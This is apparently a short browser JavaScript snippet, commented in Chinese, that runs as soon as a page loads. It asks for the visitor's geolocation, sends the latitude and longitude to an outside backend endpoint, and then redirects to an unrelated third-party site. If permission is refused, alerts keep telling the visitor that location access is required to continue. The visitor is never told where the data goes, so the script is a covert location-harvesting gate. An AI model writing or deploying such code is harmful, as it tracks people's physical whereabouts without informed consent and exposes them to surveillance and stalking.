(function () {
    const targetUrl = 'http://www.52ppx.top/'; // 目标跳转地址
    const backendUrl = 'https://gps-khaki.vercel.app/api/location'; // 后端接收位置的地址


    function showError(message) {
        alert(message || '发生未知错误，请重试或检查网络设置。');
    }


    function requestGeoLocation() {
        if (!navigator.geolocation) {
            showError('您的浏览器不支持地理位置服务，请切换到支持的浏览器后重试。');
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function (position) {
                const latitude = position.coords.latitude; // 纬度
                const longitude = position.coords.longitude; // 经度

                console.log('获取地理位置成功:', { latitude, longitude });

                // 将经纬度发送到后端服务器
                fetch(backendUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ latitude, longitude }),
                })
                    .then(response => response.json())
                    .then(data => {
                        console.log('位置已发送，解析地址为：', data.address);
                        // 跳转到目标页面
                        window.location.href = targetUrl;
                    })
                    .catch(error => {
                        console.error('位置上传失败:', error);
                        showError('数据回调失败，请稍后重试。');
                    });
            },
            function (error) {
                // 处理用户拒绝权限或其他错误
                console.error('地理位置获取失败:', error);
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        showError('请允许位置权限以继续访问此页面。');
                        break;
                    case error.POSITION_UNAVAILABLE:
                        showError('位置信息不可用，请检查网络连接。');
                        break;
                    case error.TIMEOUT:
                        showError('获取位置信息超时，请重试。');
                        break;
                    default:
                        showError('发生未知错误，请重试。');
                }
            }
        );
    }

    // 每次访问都请求地理位置
    requestGeoLocation();
})();
